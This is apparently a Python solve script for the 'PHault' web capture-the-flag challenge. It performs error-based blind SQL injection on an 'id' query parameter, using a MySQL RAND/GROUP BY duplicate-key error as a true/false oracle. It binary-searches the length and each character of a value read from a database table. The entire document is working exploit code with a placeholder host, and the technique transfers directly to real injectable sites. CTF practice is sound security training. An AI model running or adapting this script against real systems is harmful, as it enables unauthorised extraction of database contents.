#!/usr/bin/env python3
# PHault @ ctf.ae (web) - blind SQLi exfiltration.
# Oracle: FATAL(4744, "Fatal error") = condition TRUE ; die(4557) = condition FALSE
# Query:  ?id=1 AND IF(<cond>,1,<RTE>) INTO @a    where RTE = runtime duplicate-error
#
# The original challenge instance is time-limited and has expired;
# set HOST to your own instance before running.
import urllib.request, urllib.parse, time, sys

HOST = "<CHALLENGE-INSTANCE-HOST>"
BASE = f"https://{HOST}/"
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0"

RTE = "(SELECT 1 FROM (SELECT COUNT(*),FLOOR(RAND(0)*2)x FROM information_schema.columns GROUP BY x)t)"

def oracle(cond, pause=1.3):
    payload = f"1 AND IF({cond},1,{RTE}) INTO @a"
    url = BASE + "?id=" + urllib.parse.quote(payload)
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "text/html,application/xhtml+xml"})
    try:
        with urllib.request.urlopen(req, timeout=12) as r:
            body = r.read()
        is_fatal = b"Fatal" in body
        time.sleep(pause)
        return is_fatal
    except Exception as e:
        print(f"  !! net err {e}", flush=True)
        time.sleep(3)
        return None

def bit_leq(expr, mid):
    r = oracle(f"{expr}>{mid}")
    if r is None:
        return None
    return not r  # <= mid

def bsearch(expr, lo, hi):
    while lo < hi:
        mid = (lo + hi) // 2
        le = bit_leq(expr, mid)
        if le is None:
            return None
        if le:
            hi = mid
        else:
            lo = mid + 1
    return lo

# 1. flag length
print("[*] length...", flush=True)
LEN = bsearch("LENGTH((SELECT flag FROM flag LIMIT 1))", 0, 128)
print(f"[+] flag length = {LEN}", flush=True)
if not LEN:
    sys.exit(1)

# 2. char by char
flag = ""
for pos in range(1, LEN + 1):
    sub = f"ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 1),{pos},1))"
    v = bsearch(sub, 32, 126)
    if v is None:
        flag += "?"
        print(f"  [{pos}] ERR", flush=True)
    else:
        flag += chr(v)
        print(f"  [{pos}] {chr(v)}  -> {flag}", flush=True)
    if flag.endswith("}"):
        break

print("=" * 50)
print(f"FLAG: {flag}")